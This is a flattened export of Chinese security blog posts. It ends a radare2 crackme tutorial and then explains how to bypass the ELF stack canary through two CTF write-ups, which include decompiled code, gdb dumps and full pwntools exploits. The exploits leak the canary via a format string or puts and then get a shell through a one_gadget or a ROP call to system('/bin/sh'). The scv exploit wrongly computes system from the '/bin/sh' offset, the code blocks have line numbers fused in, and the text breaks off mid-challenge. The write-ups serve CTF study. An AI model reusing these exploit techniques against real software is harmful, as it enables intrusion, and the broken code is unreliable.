0x8048665| ||| ; JMP XREF from 0x08048629 (main)| ||| ; JMP XREF from 0x08048641 (main)| |-&gt; 0x08048655 83ec0c sub esp, 0xc| | 0x08048658 6836870408 push str.Nop__Wrong_argument._n ; “Nop, Wrong argument..” @ 0x8048736| | 0x0804865d e8defcffff call sym.imp.puts ; int puts(const char *s)| | 0x08048662 83c410 add esp, 0x10| | ; JMP XREF from 0x08048653 (main)| `—&gt; 0x08048665 b800000000 mov eax, 0| 0x0804866a 8d65f8 lea esp, [ebp – local_8h]| 0x0804866d 59 pop ecx| 0x0804866e 5b pop ebx| 0x0804866f 5d pop ebp| 0x08048670 8d61fc lea esp, [ecx – 4]\\ 0x08048673 c3 ret 看过汇编代码后，我们可以写出一段简单的伪代码： 12345678910111213if (argc &gt; 1 &amp;&amp; beet(argv[1]) == true)# i.e - if any argument passed to the program AND the result of beet, given the passed argument, is true# argc is the number of arguments passed to the program# argc will be at least 1 becuase the first argument is the program name# argv is the array of parameters passed to the program&#123; print \"success\"&#125;else&#123; print \"fail\"&#125;exit 可视化模式和图形模式radare2有着一个非常强大、效率极高的可视化模式。可视化模式对用户非常友好并且将使用r2的逆向过程带到了一个新的高度。按下V键开启可视化模式。按下p/P键用来切换模式。在屏幕的最上方可以看到你输入的命令。这里按p可以切换回原来的反汇编模式。 可视化模式基本命令移动你可以通过k向上移动，通过j向下移动。回车键可以jmp或者call到目标地址。同时在每个jmp或call右侧注释的方括号中有数字，直接按相应的数字可跳转到对应地址。 帮助正如之前命令行下的radare2，按下?可以为你展现帮助窗口，你可以学习可视化模式下的各个命令。 交叉引用用x/X分别来列出当前函数的引用和调用的情况。按下对应数字来跳转。 radare2命令使用：在可视化模式下输入:command来执行r2命令 注释你可以通过;[-]comment来添加或删去注释。 标记m&lt;key&gt;可以用来标记特定的偏移地址。&#39;&lt;key&gt;来跳到指定地址。 退出按下q键返回到r2的 shell。 可视化图形模式和其他的一些反汇编器一样，radare2也有图形视图。你可以输入VV从 shell 进入图形视图，通过k/j/h/l向上/下/左/右移动，按g键跳转到目标函数（例如gd）。 按?来列出所有的命令，其中R命令值得一学。 反汇编beet函数接下来回到反汇编函数上，看看beet函数。正如我们之前所看到的，我们的程序检查了beet的返回结果，也就是我们输入的参数。我们可以通过一些方式输出beet的返回值，这里列出几种： 在r2的 shell 中定位到beet函数，然后通过s sym.beet（sym.beet是beet函数的一个标志。你可以通过f sym.&lt;tab&gt;输出出sym的标志）输出函数，然后执行pdf（Print Disassemble Function）； 在r2的 shell 下，通过pdf @ sym.beet输出beet函数。@是临时的定位（输出sym.beet地址处的函数）； 可视化模式下在 main 函数下跳到beet函数； 可视化图形界面下在 main 函数中使用gd（d是call边上的字母） 这是beet函数在图形视图下的样子： 我们可以看到输入的参数被复制给了一个缓冲空间。缓存区的位置在ebp - local_88h。local_88h其实是 0x88，也就是十进制的 136。在可视化模式下，我们可以用:执行r2的命令? 0x88查看。 12:&gt; ? 0x88136 0x88 0210 136 0000:0088 136 “\\x88” 10001000 136.0 136.000000f 136.000000 由于 4 个字节保存了前一个栈帧的 ebp 值，接下来的 4 个字节则是返回地址，因此在栈上的缓冲区大小为 128 个字节，总共为 136 个字节。 在缓冲区之后是我们输入的参数，它和函数sym.rot13的结果进行比较。Rot-13是一个著名的置换加密，经常在 CTF 以及 Crackme 中使用。这个函数接收了 9 个十六进制数，看起来radare2没有把它们识别成一个字符串。我们可以在其地址上执行ahi s。 1:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7 ahi s用来将将具体地址转换成字符串（试试ahi?）。@@是一个迭代器（试试@@），然后这些地址则是sym.beet函数中没被radare2识别成字符串的部分。执行完这条命令后，图形视图会自动刷新（如果没有自动刷新，执行r）成这样： 看起来没被识别出来的字符串是Megabeets（根据字节序反向压栈得到）。 该程序通过strcmp将经过 rot13 处理后的Megabeets与我们输入的参数进行比较。幸运的是我们不需要辛苦地分析 rot13 的具体算法，因为r2框架中的rahash2工具已经包含了 rot13 加密。 rahash2通过不同的算法计算文件或是字符串的校验值。 使用man rahash2查看更多的用法。 12:&gt; !rahash2 -E rot -S s:13 -s ‘Megabeets\\n’Zrtnorrgf rahash2执行了rot13(“Megabeets”)后得到了字符串Zrtnorrgf。输入!可以在r2的 shell 下执行系统命令。我们假设Zrtnorrgf就是要和我们的输入进行比较的字符串。让我们在调试模式下打开程序，使用ood（试试ood?）并将Zrtnorrgf作为参数，看看我们会得到什么。 12345678910111213[0xf7749be9]&gt; ood?| ood [args] reopen in debugger mode (with args)[0xf7749be9]&gt; ood ZrtnorrgfWait event received by different pid 7415Wait event received by different pid 7444Process with PID 7575 started…File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode= attach 7575 7575Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1[0xf7749be9]&gt; dcSelecting and continuing: 7575.:: Megabeets ::.Think you can make it?Success!PTRACE_EVENT_EXIT pid=7575, status=0x0 我们收到了成功的提示，破解了这个 Crackme。在成功破解之后，我们终于可以说这个程序就是将我们输入的第一个参数与rot13(“Megabeets”)进行了比较，也就是Zrtnorrgf。 你可以在这里查看 Crackme 的完整源码。 后记Radare2之旅第一部分就告一段落了。我们只接触了radare2的表皮，仅仅了解了它最最基础的一些功能。在下一部分中，我们将会学习更多的关于radare2的功能，包括脚本处理、恶意软件分析和漏洞利用。我知道对于很多人来说一开始是很难的，不管是能否感受到radare2的强大之处，亦或是将你的以前的习惯放到一边而熟悉使用radare2。不管你是一个逆向工程师、一个 CTF 比赛选手或者只是一个安全爱好者，我敢保证将radare2收入你的工具箱绝对一个是明智的选择。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"translation","slug":"translation","permalink":"blog.b3ale.cn/tags/translation/"}]},{"title":"绕过ELF的安全防护机制Canary","slug":"绕过ELF的安全防护机制Canary","date":"2019-02-15T08:21:43.000Z","updated":"2019-08-26T05:55:00.833Z","comments":true,"path":"2019/02/15/绕过ELF的安全防护机制Canary/","link":"","permalink":"blog.b3ale.cn/2019/02/15/绕过ELF的安全防护机制Canary/","excerpt":"入门 canary。","text":"入门 canary。 何为 Canary由于stack overflow而引发的攻击非常普遍也非常古老，相应地一种叫做Canary的技术很早就出现在glibc里，直到现在也作为系统安全的第一道防线存在。Canary的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的 canary 值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。Canary不管是实现还是设计思想都比较简单高效，就是插入一个值，在stack overflow发生的高危区域的尾部，当函数返回之时检测Canary的值是否经过了改变，以此来判断stack/buffer overflow是否发生。Canary与 Windows 下的GS保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。 以 32 位程序为例。没开 Canary 时的栈： 1234567891011+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| ebp |+------------------+| return addr |+------------------+ 开启 Canary 后的栈： 12345678910111213+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| canary | &lt;- Random+------------------+| ebp |+------------------+| return addr |+------------------+ 在EBP之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测Canary是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖Canary，这时程序会直接退出。只有泄漏了Canary，才能 overflow 后面的 return address： 123456789 0x804852b &lt;func+71&gt;: mov eax,DWORD PTR [ebp-0xc] 0x804852e &lt;func+74&gt;: xor eax,DWORD PTR gs:0x14=&gt; 0x8048535 &lt;func+81&gt;: je 0x804853c &lt;func+88&gt; | 0x8048537 &lt;func+83&gt;: call 0x8048390 &lt;__stack_chk_fail@plt&gt; | 0x804853c &lt;func+88&gt;: leave | 0x804853d &lt;func+89&gt;: ret | 0x804853e &lt;main&gt;: lea ecx,[esp+0x4] |-&gt; 0x804853c &lt;func+88&gt;: leave 0x804853d &lt;func+89&gt;: ret 如果没有绕过Canary，就会call到 glibc 中的函数__stack_chk_fail： 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; Canary绕过技术泄漏CanaryCanary设计为以字节\\x00结尾，本意是为了保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露Canary，之后再次溢出控制执行流程。如果存在format string那么还可以泄漏Canary。 2016-insomnihack-microwavechecksec一下程序，64 位 elf，保护全开： 1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 拖进 ida 查看一下程序。程序大概上是连接 tweeter 账户，编辑内容，发布最喜爱食物： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char *v3; // r12 char input; // [rsp+0h] [rbp-38h] unsigned __int64 v5; // [rsp+8h] [rbp-30h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); v3 = (char *)malloc(0x3EuLL); puts(\"\\n --------------------------------------------------------\"); puts(\" | Welcome to the next generation of MicroWaves! |\"); puts(\" | *** |\"); puts(\" | This stylish Microwave with Grill function, includes |\"); puts(\" | a function that tweets your favourite food! |\"); puts(\" | *** |\"); puts(\" --------------------------------------------------------\"); fflush(0LL); while ( 1 ) &#123; while ( 1 ) &#123; choice(); fwrite(\"\\n [MicroWave]: \", 1uLL, 0x19uLL, stdout); fgets(&amp;input, 3, stdin); if ( input != '2' ) break; if ( *((_WORD *)v3 + 30) == 1 ) edit(); else fwrite(\"\\n First: please connect to your Twitter account!\\n\\n\", 1uLL, 0x37uLL, stdout); &#125; if ( input &lt;= '2' ) &#123; if ( input == '1' ) // choice 1 &#123; fwrite(\"\\n Log in on Twitter:\\n\", 1uLL, 0x1FuLL, stdout); fwrite(\" username: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3, 40, stdin); fwrite(\" password: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3 + 40, 20, stdin); connect(v3); &#125; &#125; else if ( input == '3' ) // choice 3 &#123; if ( *((_WORD *)v3 + 30) == 1 ) tweet(); else fwrite(\"\\n Hey Dude! This didn't work out!\\n\\n\", 1uLL, 0x28uLL, stdout); &#125; else if ( input == 'q' ) // quit &#123; fwrite(\"\\n Bye!\\n\\n\", 1uLL, 0x12uLL, stdout); exit(0); &#125; &#125;&#125; 在connect()函数中，发现了一个需要过的 check 密码，同时还有用户名的输入存在format string，故这里可以泄漏出栈上的Canary： 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall connect(char *input)&#123; size_t j; // rbx char *string; // rbx size_t v3; // rax __int64 i; // rdx unsigned __int64 v6; // [rsp+8h] [rbp-20h] j = 1LL; v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\nChecking \"); __printf_chk(1LL, (__int64)input); puts(\"Twitter account\"); fflush(0LL); while ( j &lt; strlen(input + 40) ) &#123; ++j; putchar('.'); fflush(0LL); usleep(0x186A0u); &#125; putchar('\\n'); string = password; v3 = strlen(password); for ( i = 0LL; ; ++i ) &#123; if ( i == v3 ) &#123; *((_WORD *)input + 30) = 1; return __readfsqword(0x28u) ^ v6; &#125; if ( input[i + 40] != string[i] ) break; &#125; *((_WORD *)input + 30) = 0; return __readfsqword(0x28u) ^ v6;&#125; 在edit()函数中存在buffer overflow，读了很长一串字符： 123456789101112unsigned __int64 edit()&#123; __int64 v1; // [rsp+0h] [rbp-418h] unsigned __int64 v2; // [rsp+408h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\n #&gt; \"); fflush(0LL); read(0, &amp;v1, 0x800uLL); puts(\"\\n Done.\"); return __readfsqword(0x28u) ^ v2;&#125; 同时通过调试可以找到栈上的某个值与 libc 的偏移，以用来计算 base： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwaveGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./microwave...(no debugging symbols found)...done.assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6assassinq&gt;&gt; rStarting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave -------------------------------------------------------- | Welcome to the next generation of MicroWaves! | | *** | | This stylish Microwave with Grill function, includes | | a function that tweets your favourite food! | | *** | -------------------------------------------------------- ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: 1 Log in on Twitter: username: %p.%p.%p.%p.%p.%p.%p.%p password: n07_7h3_fl46Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710Twitter account............ ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: ^CProgram received signal SIGINT, Interrupt.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x400RSI: 0x555555759060 (&quot;n07_7h3_fl46\\np.%p.%p.%p\\n&quot;)RDI: 0x0RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)R8 : 0x7ffff7dd3780 --&gt; 0x0R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)R11: 0x246R12: 0xa (&apos;\\n&apos;)R13: 0x2R14: 0x55555575906d (&quot;p.%p.%p.%p\\n&quot;)R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7ffff7b04257 &lt;read+7&gt;: jne 0x7ffff7b04269 &lt;read+25&gt; 0x7ffff7b04259 &lt;__read_nocancel&gt;: mov eax,0x0 0x7ffff7b0425e &lt;__read_nocancel+5&gt;: syscall=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001 0x7ffff7b04266 &lt;__read_nocancel+13&gt;: jae 0x7ffff7b04299 &lt;read+73&gt; 0x7ffff7b04268 &lt;__read_nocancel+15&gt;: ret 0x7ffff7b04269 &lt;read+25&gt;: sub rsp,0x8 0x7ffff7b0426d &lt;read+29&gt;: call 0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad22880024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a310032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;: cmp eax,0xffffffff)0040| 0x7fffffffda50 --&gt; 0x00048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;: cmp eax,0xffffffff)0056| 0x7fffffffda60 --&gt; 0x19[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGINT0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484 ../sysdeps/unix/syscall-template.S: No such file or directory.assassinq&gt;&gt; vmmapStart End Perm Name0x0000555555554000 0x0000555555557000 r-xp /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555757000 0x0000555555758000 r--p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555758000 0x0000555555759000 rw-p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555759000 0x000055555577a000 rw-p [heap]0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffdd000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 最后放上 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env pythonfrom pwn import *# context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;local = 0if local: p = process(&apos;./microwave&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) libc_base_offset = 0xf72c0 one_gadget_offset = 0x45216else: p = remote(&apos;127.0.0.1&apos;, 1337) libc = ELF(&apos;./libc.so.6&apos;) libc_base_offset = 0xeb870 one_gadget_offset = 0x464d8elf = ELF(&apos;./microwave&apos;)log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))def connect(username, password): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;) p.sendlineafter(&apos;username:&apos;, username) p.sendlineafter(&apos;password:&apos;, password)def edit(content): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;) p.sendlineafter(&apos;#&gt;&apos;, content)def tweet(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)def quit(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)# gdb.attach(p)password = &apos;n07_7h3_fl46&apos;connect(&apos;%p.&apos; * 8, password)p.recvuntil(&apos;Checking&apos;)leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]print leak_datacanary = int(leak_data[5][2:], 16)log.success(&apos;canary = &apos; + hex(canary))leak_libc = int(leak_data[1][2:], 16)log.success(&apos;leak_libc = &apos; + hex(leak_libc))libc_base = leak_libc - libc_base_offsetlog.success(&apos;libc_base = &apos; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetlog.success(&apos;one_gadget = &apos; + hex(one_gadget))payload = flat([ &apos;A&apos; * 1032, canary, &apos;B&apos; * 8, one_gadget])edit(payload)p.interactive() 2017-CSAW-Quals-scv开了Canary： 123456[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 就只有一个 main 函数，由于是 c++程序，看起来有点混乱： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax __int64 v10; // rax __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // rax __int64 v16; // rax __int64 v17; // rax __int64 v18; // rax __int64 v19; // rax __int64 v20; // rax __int64 v21; // rax int choice; // [rsp+4h] [rbp-BCh] int v24; // [rsp+8h] [rbp-B8h] int v25; // [rsp+Ch] [rbp-B4h] char buf; // [rsp+10h] [rbp-B0h] unsigned __int64 v27; // [rsp+B8h] [rbp-8h] v27 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); choice = 0; v24 = 1; v25 = 0; while ( v24 ) &#123; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV GOOD TO GO,SIR....\"); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"1.FEED SCV....\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"2.REVIEW THE FOOD....\"); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"3.MINE MINERALS....\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice); switch ( choice ) &#123; case 2: // show v15 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]REVIEW THE FOOD...........\"); std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v17 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v18 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]PLEASE TREAT HIM WELL.....\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v19 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); puts(&amp;buf); break; case 3: // exit v24 = 0; v20 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]BYE ~ TIME TO MINE MIENRALS...\"); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; case 1: // edit v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV IS ALWAYS HUNGRY.....\"); std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]GIVE HIM SOME FOOD.......\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); v25 = read(0, &amp;buf, 0xF8uLL); break; default: v21 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]DO NOT HURT MY SCV....\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; &#125; &#125; return 0LL;&#125; 在case 1存在buffer overflow，通过调试观察到输入与Canary之间的偏移为 168。如果要泄漏Canary的话，就必须让所有的\\x00被覆盖掉，包括Canary低位的\\x00，以让puts认为 buf 连同Canary为一个字符串。libc 也可以用同样的方式泄漏，最后放上 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./scv', env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)else: p = remote('127.0.0.1', 8888)libc = ELF('./libc-2.23.so')elf = ELF('./scv')# gdb.attach(p)system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))pop_rdi_ret = 0x0000000000400ea3log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))one_gadget_offset = 0x45216log.success('one_gadget_offset = ' + hex(one_gadget_offset))libc_base_offset = 0x3a20alog.success('libc_base_offset = ' + hex(libc_base_offset))def edit(content): p.sendlineafter('&gt;&gt;', '1') p.recvuntil('&gt;&gt;') p.send(content)def show(): p.sendlineafter('&gt;&gt;', '2')def quit(): p.sendlineafter('&gt;&gt;', '3')edit('A' * (40 - 1) + ':')show()p.recvuntil(':')leak_addr = u64(p.recv(6).ljust(8, '\\x00'))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_base_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + str_bin_sh_offsetstr_bin_sh = libc_base + str_bin_sh_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))edit('A' * 168 + ':')show()p.recvuntil(':')canary = u64('\\x00' + p.recv(7))log.success('canary = ' + hex(canary))payload = flat([ 'A' * 168, canary, 'B' * 8, pop_rdi_ret, str_bin_sh, system])edit(payload)quit()p.interactive() 爆破CanaryCanary之所以被认为是安全的，是因为对其进行爆破成功率太低。以 32 位程序为例，除去最后一个\\x00，其可能值将会是0x100^3=16777216（实际上由于Canary的生成规则会小于这个值），64 位下的Canary值更是远大于这个数量级。此外，一旦Canary爆破失败，程序就会立即结束，Canary值也会再次更新，使得爆破更加困难。但是同一个进程内所有的Canary值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。 2017-NSCTF-pwn2123456[*] 